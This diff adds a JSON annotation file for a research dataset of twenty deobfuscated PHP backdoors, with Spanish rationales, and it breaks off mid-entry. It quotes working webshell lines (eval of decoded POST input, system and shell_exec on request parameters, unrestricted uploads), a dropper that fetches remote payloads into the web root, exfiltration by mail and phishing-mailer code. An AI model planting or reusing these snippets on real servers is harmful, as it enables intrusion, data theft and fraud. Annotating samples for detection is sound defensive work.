@@ -1,0 +1,943 @@
+{
+  "version": 1,
+  "selection": "First 20 eligible deobfuscated PHP-backdoors samples ordered by byte size then path; convenience sample, not representative.",
+  "policy": "Source assignments, sinks and directly associated malicious operations; auxiliary UI and neutral setup excluded. Ambiguous rows retain candidate lines only, never localization ground truth.",
+  "independent_human_review": false,
+  "cases": [
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/Unknown_fce2568bbf104af3c345f1c0069edcb057d2fb2a.php",
+      "sha256": "a5ee5bb409279588623b5898c3302127d1d5d1cbb5ab6aa129150745fba48356",
+      "annotation_status": "complete_assisted",
+      "behavior": "dynamic_execution",
+      "malicious_lines": [
+        3
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            3
+          ],
+          "rationale": "Entrada POST se transforma, decodifica y entrega a eval en la misma línea.",
+          "source_lines": {
+            "3": "if(isset($_POST['com']) && md5($_POST['com']) == '66d18dc9cbd1b87d4460a2ce37d8e835' && isset($_POST['content'])) $kk = strtr($_POST['content'], '-_,', '+/=');eval(base64_decode($kk));"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/Unknown_37d2c2e4f0bd223cee2e4c01c1d2985be69d99e5.php",
+      "sha256": "ffb6f27d13576c025bb8f823afc625a3d49176f0b421d8aba1d9134f6a58ac1c",
+      "annotation_status": "complete_assisted",
+      "behavior": "unrestricted_upload",
+      "malicious_lines": [
+        1
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            1
+          ],
+          "rationale": "copy publica un archivo subido bajo el nombre elegido por el cliente, sin restricción visible de tipo o autorización.",
+          "source_lines": {
+            "1": "<?php @set_time_limit(0);@header('null77: pOinter');?><form method='POST' enctype='multipart/form-data'><input type='file' name='f'/><input type='submit' value='up'/></form><?php echo @copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])?'ok':'no';?>"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/UploadShell_a24ae81090aeb43807d13a54426b76a65aeefcd0.php",
+      "sha256": "f36caf2d7e37ce85cd13e461336ef41d9765a678d314131ad4838f867b69b4d8",
+      "annotation_status": "complete_assisted",
+      "behavior": "unrestricted_upload",
+      "malicious_lines": [
+        6,
+        7
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            6,
+            7
+          ],
+          "rationale": "La condición de subida y move_uploaded_file aceptan nombre y contenido enviados por el cliente; sin validación visible.",
+          "source_lines": {
+            "6": "if( $_POST['_upl'] == \"Upload\" ) {",
+            "7": "    if(@move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/Unknown_623fed792107800688538ad113a5a2c5050b876d.php",
+      "sha256": "731f36a08b0e63c63b3a2a457667dfc34aa7ff3a2aee24e60a8d16b83ad44ce2",
+      "annotation_status": "complete_assisted",
+      "behavior": "dropper_and_cleanup",
+      "malicious_lines": [
+        4,
+        5,
+        6,
+        7,
+        8,
+        9
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            4,
+            5,
+            6,
+            7,
+            8,
+            9
+          ],
+          "rationale": "El literal contiene una webshell system($_GET[cmd]); se escribe Gass.php y se ejecutan operaciones de limpieza/borrado.",
+          "source_lines": {
+            "4": "$file  = '<style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}</style><title>Hacked by FasT ReaCtoR</title><center><div id=q>Hacked by FasT ReaCtoR<br>",
+            "5": "<?php system(\"$_GET[cmd]\");echo \"<br>O_O\";exit; ?>';",
+            "6": "$r=fopen(\"../../../../../../Gass.php\", \"w\");fwrite($r,$file);fclose($r);",
+            "7": "$r=fopen(\"x.php\", \"w\");fwrite($r,\"\");fclose($r);",
+            "8": "system (\"rm ../revslider.zip\");",
+            "9": "if(file_exists(\"x.php\")) unlink(\"x.php\");"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/UploadShell_667e1cb7206b7558e790bef24fae2b8e9142ca35.php",
+      "sha256": "5ea5609982e115102d3d117d401eaa6c7dbbf3a3eb3fefca8f9b8420cd0a4dd1",
+      "annotation_status": "complete_assisted",
+      "behavior": "unrestricted_upload",
+      "malicious_lines": [
+        5,
+        6
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            5,
+            6
+          ],
+          "rationale": "copy conserva el nombre de archivo recibido sin restricciones visibles.",
+          "source_lines": {
+            "5": "if( $_POST['_upl'] == \"Upload\" ) {",
+            "6": "if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<center><br><br><b><font color=\"#11f0f3\">UPLOAD SUCCESS!</font></b></center><br><br>'; }"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/Unknown_8cd1157093d82e0928029b8eaf82c6839e271ef2.php",
+      "sha256": "e65591836ae668410a7bab0d07c2184d44990e54170f36daacd561952ea9bd6d",
+      "annotation_status": "complete_assisted",
+      "behavior": "unrestricted_upload",
+      "malicious_lines": [
+        8,
+        9,
+        11,
+        12,
+        13
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            8,
+            9,
+            11,
+            12,
+            13
+          ],
+          "rationale": "Nombre y temporal proceden de FILES, se publica el archivo y se cambian sus permisos.",
+          "source_lines": {
+            "8": "\t$userfile_name = $_FILES['image']['name'];",
+            "9": "\t$userfile_tmp = $_FILES['image']['tmp_name'];",
+            "11": "\t\t$qx = $filedir.$userfile_name;",
+            "12": "\t\t@move_uploaded_file($userfile_tmp, $qx);",
+            "13": "\t\t@chmod ($qx, octdec($mode));"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/UploadShell_0ca8bc4e25038ff4f395cdab450932f1b98527c1.php",
+      "sha256": "b87101417eccec070286d844dca976983d720658d10e1d8b2c16455605e07a08",
+      "annotation_status": "complete_assisted",
+      "behavior": "unrestricted_upload",
+      "malicious_lines": [
+        8,
+        9,
+        11,
+        12,
+        13
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            8,
+            9,
+            11,
+            12,
+            13
+          ],
+          "rationale": "Variante del uploader anterior; misma cadena nombre/temporal de FILES hacia move_uploaded_file y chmod.",
+          "source_lines": {
+            "8": "\t$userfile_name = $_FILES['image']['name'];",
+            "9": "\t$userfile_tmp = $_FILES['image']['tmp_name'];",
+            "11": "\t\t$qx = $filedir.$userfile_name;",
+            "12": "\t\t@move_uploaded_file($userfile_tmp, $qx);",
+            "13": "\t\t@chmod ($qx, octdec($mode));"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/UploadShell_20281d16838f707c86b1ff1428a293ed6aec0e97.php",
+      "sha256": "2c23228589ab2baa508f63b7713e33da8aab59028fde851c065db3e5a11947cc",
+      "annotation_status": "complete_assisted",
+      "behavior": "self_copy_and_upload",
+      "malicious_lines": [
+        16,
+        17,
+        18,
+        23,
+        24
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            16,
+            17,
+            18,
+            23,
+            24
+          ],
+          "rationale": "Copia su propio script a default.php y permite subir archivos conservando el nombre enviado.",
+          "source_lines": {
+            "16": "$source = $_SERVER['SCRIPT_FILENAME'];",
+            "17": "$desti =$_SERVER['DOCUMENT_ROOT'].\"/default.php\";",
+            "18": "copy($source, $desti);",
+            "23": "if( $_POST['_upl'] == \"Upload\" ) {",
+            "24": "\tif(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/UploadShell_026f31ce1f06adc3e1b3c69ab4f3a3cd73af01dd.php",
+      "sha256": "9a28006fef35af2e7c13850b17b48075817fce8c99cdfaf64da540d01761dfd5",
+      "annotation_status": "complete_assisted",
+      "behavior": "unrestricted_upload",
+      "malicious_lines": [
+        2,
+        3,
+        5
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            2,
+            3,
+            5
+          ],
+          "rationale": "Destino en el directorio actual calculado con el nombre recibido; move_uploaded_file publica el temporal.",
+          "source_lines": {
+            "2": "    $uploaddir = getcwd() . \"/\";",
+            "3": "    $uploadfile = $uploaddir . basename($_FILES[\"userfile\"][\"name\"]);",
+            "5": "    if (move_uploaded_file($_FILES[\"userfile\"][\"tmp_name\"], $uploadfile))  {"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/WebShell_5baf031af52d9d0b7c14b0a737a371e8fbfd62e5.php",
+      "sha256": "da136ba4615643a34c0135e8da9793c24e1ec236a0f8ace9c74020803b2b46c1",
+      "annotation_status": "complete_assisted",
+      "behavior": "self_copy_and_upload",
+      "malicious_lines": [
+        16,
+        17,
+        18,
+        23,
+        24
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            16,
+            17,
+            18,
+            23,
+            24
+          ],
+          "rationale": "Copia de sí mismo al webroot y operación de subida sin restricción visible de extensión.",
+          "source_lines": {
+            "16": "$source = $_SERVER['SCRIPT_FILENAME'];",
+            "17": "$desti =$_SERVER['DOCUMENT_ROOT'].\"/default.php\";",
+            "18": "copy($source, $desti);",
+            "23": "if( $_POST['_upl'] == \"Upload\" ) {",
+            "24": "        if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/Unknown_f0edeefbb11fec1f4a37d76f4acaa4cb2aa3dde9.php",
+      "sha256": "111641c6f65995e9f9f61a9a470287f773011bdf184d166526ebdd7eb10d6dae",
+      "annotation_status": "ambiguous",
+      "behavior": "bulk_mail",
+      "malicious_lines": [
+        7,
+        9,
+        11,
+        13,
+        44,
+        48,
+        54,
+        62,
+        67
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            7,
+            9,
+            11,
+            13,
+            44,
+            48,
+            54,
+            62,
+            67
+          ],
+          "rationale": "El código permite envío masivo desde parámetros POST. La pertenencia a una colección no demuestra por sí sola intención maliciosa; podría ser un newsletter inseguro.",
+          "source_lines": {
+            "7": "\t\t\t\t$message = $_POST['html'];",
+            "9": "\t\t\t\t$subject = $_POST['assunto'];",
+            "11": "\t\t\t\t$de = $_POST['de'];",
+            "13": "\t\t\t\t$to = $_POST['emails'];",
+            "44": "\t\t\t\t$email = explode(\"\\n\", $to);",
+            "48": "\t\t\t\t$headers .= \"From: \".$RealName.\" <\".$de.\">\\r\\n\";",
+            "54": "\t\t\t\t$message = stripslashes($message);",
+            "62": "\t\t\t\twhile($email[$i]) {",
+            "67": "if(mail($email[$i], $subject, $message, $headers))"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/Unknown_09b9f0ae3cd5416c53903671574c97a23f185094.php",
+      "sha256": "9282e47f9037656ff4c7584b8774a9c8db77459ced8fa15673900b48628e8067",
+      "annotation_status": "partial_assisted",
+      "behavior": "remote_dropper",
+      "malicious_lines": [
+        3,
+        8,
+        11,
+        12,
+        13,
+        14,
+        21,
+        22,
+        23,
+        24,
+        32,
+        33,
+        34,
+        35,
+        38,
+        39,
+        40,
+        41,
+        44,
+        45,
+        46,
+        47,
+        50,
+        51,
+        52,
+        53,
+        57
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            3,
+            8,
+            11,
+            12,
+            13,
+            14,
+            21,
+            22,
+            23,
+            24,
+            32,
+            33,
+            34,
+            35,
+            38,
+            39,
+            40,
+            41,
+            44,
+            45,
+            46,
+            47,
+            50,
+            51,
+            52,
+            53,
+            57
+          ],
+          "rationale": "Descarga recursos remotos, los escribe como PHP/archivos del servidor y se borra. No se consultaron las URLs ni se verificó el contenido descargado.",
+          "source_lines": {
+            "3": "\t$im = curl_init($url);",
+            "8": "\treturn curl_exec($im);",
+            "11": "$check = $_SERVER['DOCUMENT_ROOT'] . \"/tmp/vip.php\" ;",
+            "12": "$text = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/vip.txt');",
+            "13": "$open = fopen($check, 'w');",
+            "14": "fwrite($open, $text);",
+            "21": "$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/tmp/upxx.php\" ;",
+            "22": "$text2 = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/uploader.txt');",
+            "23": "$open2 = fopen($check2, 'w');",
+            "24": "fwrite($open2, $text2);",
+            "32": "$check3=$_SERVER['DOCUMENT_ROOT'] . \"/x.txt\" ;",
+            "33": "$text3 = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/deface.txt');",
+            "34": "$op3=fopen($check3, 'w');",
+            "35": "fwrite($op3,$text3);",
+            "38": "$check4=$_SERVER['DOCUMENT_ROOT'] . \"/tmp/check.php\" ;",
+            "39": "$text4 = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/check.txt');",
+            "40": "$op4=fopen($check4, 'w');",
+            "41": "fwrite($op4,$text4);",
+            "44": "$check5=$_SERVER['DOCUMENT_ROOT'] . \"/x.php\" ;",
+            "45": "$text5 = http_get('http://talkbusinessmagazine.co.uk/wp-content/joomla/deface.txt');",
+            "46": "$op5=fopen($check5, 'w');",
+            "47": "fwrite($op5,$text5);",
+            "50": "$check6=$_SERVER['DOCUMENT_ROOT'] . \"/libraries/joomla/session/session.php\" ;",
+            "51": "$text6 = http_get('http://pastebin.com/raw/UHAGT887');",
+            "52": "$op6=fopen($check6, 'w');",
+            "53": "fwrite($op6,$text6);",
+            "57": "@unlink(__FILE__);"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/MailerShell_d00bb65e7f7cc219fa162857d8b88b8affeb831c.php",
+      "sha256": "bb11ff9b0542f222a72f55aa1ee1ecc37044fedef007d0bd75623c98d1e3e698",
+      "annotation_status": "ambiguous",
+      "behavior": "bulk_mail",
+      "malicious_lines": [
+        5,
+        6,
+        7,
+        8,
+        36,
+        44,
+        52,
+        59,
+        71,
+        72
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            5,
+            6,
+            7,
+            8,
+            36,
+            44,
+            52,
+            59,
+            71,
+            72
+          ],
+          "rationale": "Envío masivo con destinatarios y cuerpo externos al script; falta contexto para distinguir herramienta legítima de spam/phishing.",
+          "source_lines": {
+            "5": "$config['maillist'] = \"xmail.txt\";",
+            "6": "$config['remetente'] = \"Andrei de Paula<webmaster.brasil@outlook.com>\";",
+            "7": "$config['assunto'] = 'Gerente de Relacionamento - [bb.com.br] ';",
+            "8": "$config['mensagem'] = 'xeng.txt';",
+            "36": "$linhas = @file($file);",
+            "44": "$linhase = @file($email);",
+            "52": "for($a=0;$a<count($linhas);$a++) {",
+            "59": "\t$to = trim($linhas[$a]);",
+            "71": "                $emails = str_replace(\"%EMAIL%\",$to,$emails);",
+            "72": "                if(!@mail($to, $assunto.$data, $emails.$boundary, \"FROM:\".$remetente.\" \\nReturn-Path: webmaster.brasil@outlook.com\\ncontent-type: text/html\\nX-priority: 1\\n\")) {"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/MailerShell_5c4c3e011b8de586dd4b0df514c8843553875dde.php",
+      "sha256": "5351bef1697249ef9c5a651e0a6d3bea12a3edc21af0a55a1041ff7113dae196",
+      "annotation_status": "ambiguous",
+      "behavior": "bulk_mail",
+      "malicious_lines": [
+        5,
+        6,
+        7,
+        8,
+        36,
+        44,
+        52,
+        59,
+        71,
+        72
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            5,
+            6,
+            7,
+            8,
+            36,
+            44,
+            52,
+            59,
+            71,
+            72
+          ],
+          "rationale": "Variante con listas remotas. No se obtuvo el contenido remoto; intención no verificable con este archivo aislado.",
+          "source_lines": {
+            "5": "$config['maillist'] = \"http://xshellnet.atwebpages.com/xmail.txt\";",
+            "6": "$config['remetente'] = \"Andrei de Paula <webmaster.brasil@outlook.com>\";",
+            "7": "$config['assunto'] = 'Gerente de Relacionamento - [bb.com.br] ';",
+            "8": "$config['mensagem'] = 'http://xshellnet.atwebpages.com/xeng.txt';",
+            "36": "$linhas = @file($file);",
+            "44": "$linhase = @file($email);",
+            "52": "for($a=0;$a<count($linhas);$a++) {",
+            "59": "\t$to = trim($linhas[$a]);",
+            "71": "                $emails = str_replace(\"%EMAIL%\",$to,$emails);",
+            "72": "                if(!@mail($to, $assunto.$data, $emails.$boundary, \"FROM:\".$remetente.\" \\nReturn-Path: webmaster.brasil@outlook.com\\ncontent-type: text/html\\nX-priority: 1\\n\")) {"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/UploadShell_d11a615f22ccbea4f6a6f016595d0e0693ed7f18.php",
+      "sha256": "7fea98eb2c96d48201081d3545a9e3a8aa402a23ae38c5b914a0684306047670",
+      "annotation_status": "partial_assisted",
+      "behavior": "command_upload_exfiltration",
+      "malicious_lines": [
+        5,
+        6,
+        7,
+        12,
+        13,
+        14,
+        19,
+        20,
+        21,
+        49,
+        50,
+        51,
+        52,
+        57,
+        58,
+        64,
+        65
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            5,
+            6,
+            7,
+            12,
+            13,
+            14,
+            19,
+            20,
+            21,
+            49,
+            50,
+            51,
+            52,
+            57,
+            58,
+            64,
+            65
+          ],
+          "rationale": "Entrada POST alcanza shell_exec; también se suben archivos, se reubica el script y se envían datos del servidor. Sintaxis final incompleta: no es una anotación exhaustiva validada.",
+          "source_lines": {
+            "5": "$web = $_SERVER[\"HTTP_HOST\"];",
+            "6": "$inj = $_SERVER[\"REQUEST_URI\"];",
+            "7": "$body = \"Shell Injector \\n$web$inj\";",
+            "12": "$serper=gethostbyname($_SERVER['SERVER_ADDR']);",
+            "13": "$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);",
+            "14": "mail(\"peterdlegend@aol.com\", \"$body\",\"Shell Result http://$web$inj\\n$security\\nIP Server = $serper\\n IP Injector= $injektor\");",
+            "19": "$source = $_SERVER['SCRIPT_FILENAME'];",
+            "20": "$desti =$_SERVER['DOCUMENT_ROOT'].\"/wp-info.php\";",
+            "21": "rename($source, $desti);",
+            "49": "$uploaddir = pwd();",
+            "50": "if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};",
+            "51": "move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name);",
+            "52": "if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name)){",
+            "57": "$cmd = $_POST['cmd'];",
+            "58": "echo \"<pre><font size=3 color=#000000>\".shell_exec($cmd).\"</font></pre>\";",
+            "64": "$conf = file_get_contents(\"../../configuration.php\");",
+            "65": "echo $conf;"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/WebShell_71826e9fb350611ac274038abea50c230549f94d.php",
+      "sha256": "9037175fc042256783758db012e30a5428fd0bf7465dbfb8e8310a15dfb8f014",
+      "annotation_status": "complete_assisted",
+      "behavior": "command_upload_exfiltration",
+      "malicious_lines": [
+        4,
+        5,
+        6,
+        10,
+        11,
+        12,
+        13,
+        18,
+        19,
+        20,
+        52,
+        53,
+        54,
+        55,
+        60,
+        61,
+        64,
+        65,
+        71,
+        72
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            4,
+            5,
+            6,
+            10,
+            11,
+            12,
+            13,
+            18,
+            19,
+            20,
+            52,
+            53,
+            54,
+            55,
+            60,
+            61,
+            64,
+            65,
+            71,
+            72
+          ],
+          "rationale": "Rutas POST y GET hacia shell_exec; subida arbitraria, movimiento del propio script, envío de datos del servidor y lectura de configuración.",
+          "source_lines": {
+            "4": "$web = $_SERVER[\"HTTP_HOST\"];",
+            "5": "$inj = $_SERVER[\"REQUEST_URI\"];",
+            "6": "$body = \"Target ditemukan \\n$web$inj\";",
+            "10": "$serper=gethostbyname($_SERVER['SERVER_ADDR']);",
+            "11": "$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);",
+            "12": "mail(\"jalangsaya@gmail.com\", \"$body\",\"Hasil Bajakan http://$web$inj\\n$security\\nIP Server = $serper\\n IP Injector= $injektor\");",
+            "13": "mail(\"jalangsaya@gmail.com\", \"$body\",\"Hasil Bajakan http://$web$inj\\n$security\\nIP Server = $serper\\n IP Injector= $injektor\");",
+            "18": "$source = $_SERVER['SCRIPT_FILENAME'];",
+            "19": "$desti =$_SERVER['DOCUMENT_ROOT'].\"/.libs.php\";",
+            "20": "rename($source, $desti);",
+            "52": "$uploaddir = pwd();",
+            "53": "if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};",
+            "54": "move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name);",
+            "55": "if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name)){",
+            "60": "$cmd = $_POST['cmd'];",
+            "61": "echo \"<pre><font size=3 color=#000000>\".shell_exec($cmd).\"</font></pre>\";",
+            "64": "$comd = $_GET['cmd'];",
+            "65": "echo \"<pre><font size=3 color=#000000>\".shell_exec($comd).\"</font></pre>\";",
+            "71": "$conf = file_get_contents(\"../../configuration.php\");",
+            "72": "echo $conf;"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/UploadShel_f0f0683373ca37df54167860b62c861e14931c40l.php",
+      "sha256": "6cb3b072948d9e91fd2eaed38627a5884e11dfe1c8ba547db5528404ec4788c9",
+      "annotation_status": "partial_assisted",
+      "behavior": "command_upload_exfiltration",
+      "malicious_lines": [
+        4,
+        5,
+        6,
+        7,
+        15,
+        16,
+        17,
+        18,
+        19,
+        20,
+        26,
+        27,
+        28,
+        65,
+        66,
+        67,
+        69,
+        70,
+        77,
+        78,
+        83,
+        84
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            4,
+            5,
+            6,
+            7,
+            15,
+            16,
+            17,
+            18,
+            19,
+            20,
+            26,
+            27,
+            28,
+            65,
+            66,
+            67,
+            69,
+            70,
+            77,
+            78,
+            83,
+            84
+          ],
+          "rationale": "Operaciones visibles de comando, subida y extracción de información. Hay cadenas/comillas malformadas, por lo que las líneas indicadas son evidencia parcial.",
+          "source_lines": {
+            "4": "    $web = $_SERVER[\"HTTP_HOST\"];",
+            "5": "    $inj = $_SERVER[\"REQUEST_URI\"];",
+            "6": "    $body = \"Shell Injector ",
+            "7": "$web$inj\";",
+            "15": "    $serper = gethostbyname($_SERVER['SERVER_ADDR']);",
+            "16": "    $injektor = gethostbyname($_SERVER['REMOTE_ADDR']);",
+            "17": "    mail(\"peterdlegend@aol.com\", \"$body\", \"Shell Result http://$web$inj",
+            "18": "$security",
+            "19": "IP Server = $serper",
+            "20": " IP Injector= $injektor\");",
+            "26": "    $source = $_SERVER['SCRIPT_FILENAME'];",
+            "27": "    $desti = $_SERVER['DOCUMENT_ROOT'] . \"/wp-info.php\";",
+            "28": "    rename($source, $desti);",
+            "65": "        $uploaddir = pwd();",
+            "66": "        if (!$name = $_POST['newname']) {",
+            "67": "            $name = $_FILES['userfile']['name'];",
+            "69": "        move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name);",
+            "70": "        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name)) {",
+            "77": "        $cmd = $_POST['cmd'];",
+            "78": "        echo \"<pre><font size=3 color=#000000>\" . shell_exec($cmd) . \"</font></pre>\";",
+            "83": "        $conf = file_get_contents(\"../../configuration.php\");",
+            "84": "        echo $conf;"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/MailserShell_98a40252a4d922b5439a0d0e8c80ba010a47d025.php",
+      "sha256": "e5c4d3dde1f0e1549d6507f2706d02ffc10a57e692f041a0464f9f973ea93187",
+      "annotation_status": "ambiguous",
+      "behavior": "bulk_mail",
+      "malicious_lines": [
+        7,
+        9,
+        11,
+        13,
+        44,
+        48,
+        54,
+        62,
+        68
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            7,
+            9,
+            11,
+            13,
+            44,
+            48,
+            54,
+            62,
+            68
+          ],
+          "rationale": "Formulario de newsletter y envío masivo; no se puede confirmar intención maliciosa solo por las llamadas mail y su procedencia.",
+          "source_lines": {
+            "7": "\t\t\t\t$message = $_POST['html'];",
+            "9": "\t\t\t\t$subject = $_POST['assunto'];",
+            "11": "\t\t\t\t$de = $_POST['de'];",
+            "13": "\t\t\t\t$to = $_POST['emails'];",
+            "44": "\t\t\t\t$email = explode(\"\\n\", $to);",
+            "48": "\t\t\t\t$headers .= \"From: \".$RealName.\" <\".$de.\">\\r\\n\";",
+            "54": "\t\t\t\t$message = stripslashes($message);",
+            "62": "\t\t\t\twhile($email[$i]) {",
+            "68": "if(mail($email[$i], $subject.$data, $message.$boundary.$boundary, $headers))"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/MailerShell_681dce6963774a96ba8c0cc024cdf61e0b8546ac.php",
+      "sha256": "5d1c1d1edb7003fca05f7de7e3e6b16c2f16920b77af0a4a41fab34a1c429241",
+      "annotation_status": "ambiguous",
+      "behavior": "bulk_mail",
+      "malicious_lines": [
+        8,
+        9,
+        10,
+        11,
+        12,
+        28,
+        43,
+        46,
+        107
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            8,
+            9,
+            10,
+            11,
+            12,
+            28,
+            43,
+            46,
+            107
+          ],
+          "rationale": "La herramienta de correo tiene control de acceso y plantillas; no se dispone de evidencia suficiente de abuso o compromiso.",
+          "source_lines": {
+            "8": "        $From=$_POST['From'];",
+            "9": "        $RealName=$_POST['RealName'];",
+            "10": "        $Subject=$_POST['Subject'];",
+            "11": "        $MailBody=$_POST['MailBody'];",
+            "12": "        $MailList=$_POST['MailList'];",
+            "28": "  if(md5($Verify)!==$protection){ exit; }",
+            "43": "  $allemails = split(\"\\n\", $MailList);",
+            "46": "  $to = $allemails[$x];",
+            "107": " mail($Destination, $Subject8, \"\", $header);"
+          }
+        }
+      ]
+    },
+    {
+      "path": "dataset/processed/php/malicious/PHP-backdoors/Deobfuscated/Unknown_899fc1460693ecdb4d7bf77dc43003476dffdc06.php",
+      "sha256": "8e06853cc96a5380d465567ec6cb90dea9bf0a16ce3a91a5d46cc1c39837f285",
+      "annotation_status": "ambiguous",
+      "behavior": "bulk_mail",
+      "malicious_lines": [
+        81,
+        82,
+        83,
+        84,
+        85,
+        86,
+        87,
+        88,
+        90,
+        91,
+        112,
+        118,
+        119,
+        120,
+        143,
+        145,
+        146
+      ],
+      "reviewer": "assistant_static_review",
+      "independent_human_review": false,
+      "evidence": [
+        {
+          "lines": [
+            81,
+            82,
+            83,
+            84,
+            85,
+            86,
+            87,
+            88,
+            90,
+            91,
+            112,
+            118,
+            119,
+            120,
+            143,
+            145,
+            146
+          ],
+          "rationale": "Envío masivo con contenido POST y cabeceras aparentando un cliente de correo. El propósito malicioso no queda demostrado sin contexto adicional.",
+          "source_lines": {
+            "81": "$enviar = $_POST['Enviar'];       // Pega o valor do bot&atilde;o Enviar caso ele seja pressionado.",
+            "82": "$remetente = $_POST['remetente']; // Pega o email do remetente.",
+            "83": "$nome = $_POST['nome'];           // Pega o nome do remetente.",
+            "84": "$assunto = $_POST['assunto'];     // Pega o assunto.",
+            "85": "$e_retorno = $_POST['returpath']; // Pega o email para retornar os erros (Return-Path)",
+            "86": "$lista_emails = $_POST['emails']; // Pega a lsita de emails.",
+            "87": "$lista_html = $_POST['html'];     // Pega os codigos html.",
+            "88": "$emails_lista = explode(\"\\n\", $lista_emails); // Pegas os emails separados por quebra de linha \"\\n\".",
+            "90": "$mensagem = $lista_html;",
+            "91": "$mensagem = stripslashes($mensagem);",
+            "112": "$headers .= \"MIME-Version: 1.0 \\n\";",
+            "118": "$headers .= \"From: Sandro de paula <webmaster.brasil@outlook.com> \\n\";",
+            "119": "$headers .= \"Return-Path: <webmaster.brasil@outlook.com> \\n\";",
+            "120": "$headers .= \"Reply-To: Sandro de paula <webmaster.brasil@outlook.com> \\n\";",
+            "143": "for($x=0; $x<$numemails; $x++){",
+            "145": "$email_go = $emails_lista[$x];",
